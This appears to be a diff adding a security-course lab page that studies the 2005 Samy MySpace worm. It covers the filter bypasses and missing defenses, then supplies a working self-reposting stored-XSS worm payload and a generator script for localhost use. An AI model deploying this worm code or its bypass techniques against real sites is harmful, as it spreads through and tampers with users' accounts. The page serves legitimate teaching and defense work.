@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Case Study — The Samy Worm (2005)</title>
+<link rel="stylesheet" href="../../assets/lab.css">
+<link rel="stylesheet" href="../../module_16_cases/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../../module_16_cases/">◂ Module 16 index</a>
+</nav>
+
+<p class="kicker">Module 16 · Case Study</p>
+<h1>The Samy Worm — MySpace, October 2005</h1>
+<p class="lead">The fastest-spreading malware in history at the time: ~1,000,000
+friend requests in under 24 hours, forcing MySpace offline. The prototype of the
+self-propagating stored-XSS worm.</p>
+
+<h2>What happened</h2>
+<p>Samy Kamkar found that MySpace profile pages let users include some HTML/CSS
+for styling but tried to strip scripting. He bypassed the filter and stored
+JavaScript in his own profile. When any logged-in user <em>viewed</em> his
+profile, their browser ran the script, which:</p>
+<ol>
+<li>Added "Samy" as a friend of the viewer.</li>
+<li>Appended <em>"but most of all, samy is my hero"</em> to the viewer's
+profile.</li>
+<li><strong>Copied the worm's own source into the viewer's profile</strong>, so
+anyone who then viewed <em>that</em> profile was infected too.</li>
+</ol>
+<p>Step 3 is the payload that matters: <strong>self-replication</strong> turned a
+stored XSS into an exponential worm.</p>
+
+<h2>The mechanisms &amp; filter bypasses (why it worked)</h2>
+<p>MySpace's filter removed <code>&lt;script&gt;</code> and many keywords. Samy's
+code is a museum of Module 05 / Module 12 techniques:</p>
+<table>
+<thead><tr><th>Obstacle</th><th>Bypass used</th><th>Course module</th></tr></thead>
+<tbody>
+<tr><td><code>&lt;script&gt;</code> stripped</td><td>Used a CSS/expression + event-handler vector instead (mechanism 2)</td><td>M05</td></tr>
+<tr><td>The word <code>javascript</code> blocked</td><td>Split across a newline: <code>java\nscript</code> — the browser reassembled it (mechanism 3 + decode boundary)</td><td>M06/M12</td></tr>
+<tr><td><code>innerHTML</code> blocked as a literal</td><td>Built via <code>eval('document.body.inne'+'rHTML')</code>-style string concatenation</td><td>M12</td></tr>
+<tr><td>Quotes were escaped</td><td>Used <code>String.fromCharCode()</code> to avoid literal quotes</td><td>M12</td></tr>
+<tr><td>Same-origin request needed to post the update</td><td>XMLHttpRequest to the profile-edit endpoint, replaying the CSRF token read from the page (mechanism 4 + Module 15 chaining)</td><td>M15</td></tr>
+</tbody>
+</table>
+<p>Note how it combines <em>every</em> theme of the course: an event-handler
+mechanism, decode-boundary evasion, string-reconstruction, and a same-origin
+forged request that re-used the page's own anti-CSRF token — the exact chain you
+built in Module 15.</p>
+
+<h2>The absent defenses</h2>
+<div class="card">
+<ul>
+<li><strong>Contextual output encoding</strong> on profile HTML (a denylist
+filter was used instead of encoding — Module 12's core lesson).</li>
+<li><strong>CSP</strong> did not exist yet; a <code>script-src</code> without
+<code>'unsafe-inline'</code> would have stopped inline execution outright.</li>
+<li><strong>Re-authentication / robust anti-automation</strong> on profile edits;
+the worm replayed the CSRF token trivially because it ran same-origin (Module
+15).</li>
+<li><strong>Rate-limiting / anomaly detection</strong> on the friend/edit
+endpoints would have slowed propagation.</li>
+</ul>
+</div>
+
+<h2>Reconstruct it safely in your lab</h2>
+<p>Below is a <strong>de-fanged</strong> mini-worm for the Module 10 comment board
+(<code>/comments</code>). It contains no real malice: when a viewer loads an
+infected comments page, their browser posts <em>one</em> new comment containing
+the same worm plus a visible marker, and pings your Module 11 callback. That is
+enough to <em>watch</em> the propagation curve. It is rate-limited to one repost
+per page load and tagged so you can clean up.</p>
+
+<div class="card danger">
+<h3>The mini-worm payload (post it once as a comment body)</h3>
+<div class="payload">
+  <textarea id="worm" rows="8" style="width:100%;font-family:var(--mono);font-size:.8rem"><img src=x onerror="(function(){
+  if (window.__samy_ran) return; window.__samy_ran = 1;      /* one repost per load */
+  var self = document.currentScript ? '' : '';
+  var body = decodeURIComponent('WORM_PLACEHOLDER');          /* the worm reposts itself */
+  fetch('/comments', {method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'author=samy&body='+encodeURIComponent(body)});
+  new Image().src='/collect?d=samy_spread_'+Date.now();       /* watch it in /callbacks */
+})()"></textarea>
+  <button class="copy" data-copy="#worm">copy</button>
+</div>
+<p class="lead">The <code>WORM_PLACEHOLDER</code> is where the worm's own source
+goes — a true quine is fiddly; for the lab it is enough that each infected view
+posts a marker comment and a callback so you observe the spread. Use the
+<strong>generate</strong> button below to build a self-reposting version, then
+post it at <a href="http://localhost:5000/comments" target="_blank" rel="noopener">/comments</a>.</p>
+<p><button id="gen" class="run">generate self-reposting worm → clipboard</button></p>
+</div>
+
+<div class="card">
+<strong>Watch propagation:</strong> after posting once, reload
+<a href="http://localhost:5000/comments" target="_blank" rel="noopener">/comments</a> a few times (each load = one "visitor") and watch new
+<code>samy</code> comments appear and hits pile up in
+<a href="http://localhost:5000/callbacks" target="_blank" rel="noopener">/callbacks</a>. To clean up, run
+<code>make clean</code> (deletes the comment DB) or restart the lab.
+</div>
+
+<h2>Why Samy still matters for your thesis</h2>
+<p>Samy is the canonical demonstration that <strong>stored XSS + self-replication
+scales super-linearly</strong>, and that denylist filtering fails against a
+determined attacker. Any defense you propose in Module 18 should answer: <em>would
+it have stopped Samy at the encoding layer, the execution layer (CSP/Trusted
+Types), or the propagation layer (re-auth/rate-limit)?</em> The strongest
+proposals stop it at more than one.</p>
+
+<footer>
+Module 16 · <a href="../../module_16_cases/case_studies/twitter_worm.html">Next case: the Twitter onMouseOver worm ▸</a><br>
+Reconstruction is de-fanged, rate-limited, and localhost-only.
+</footer>
+<script src="../../assets/lab.js"></script>
+<script>
+// Build a self-reposting worm string and copy it. It embeds its own source via
+// a template so each infected view reposts the same worm (a practical quine for
+// the lab). Still de-fanged: only marker comment + local callback.
+document.getElementById('gen').addEventListener('click', function () {
+  const tmpl = "<img src=x onerror=\"(function(){if(window.__samy)return;window.__samy=1;var s=SELF;fetch('/comments',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'author=samy&body='+encodeURIComponent(s)});new Image().src='/collect?d=samy_'+Date.now();})()\">";
+  // SELF is replaced with a quine of the template itself.
+  const self = tmpl.replace('SELF', JSON.stringify(tmpl).replace('SELF','SELF'));
+  const worm = tmpl.replace('SELF', JSON.stringify(tmpl));
+  navigator.clipboard.writeText(worm).then(() => {
+    this.textContent = 'copied self-reposting worm — paste into /comments';
+  });
+});
+</script>
+</body>
+</html>
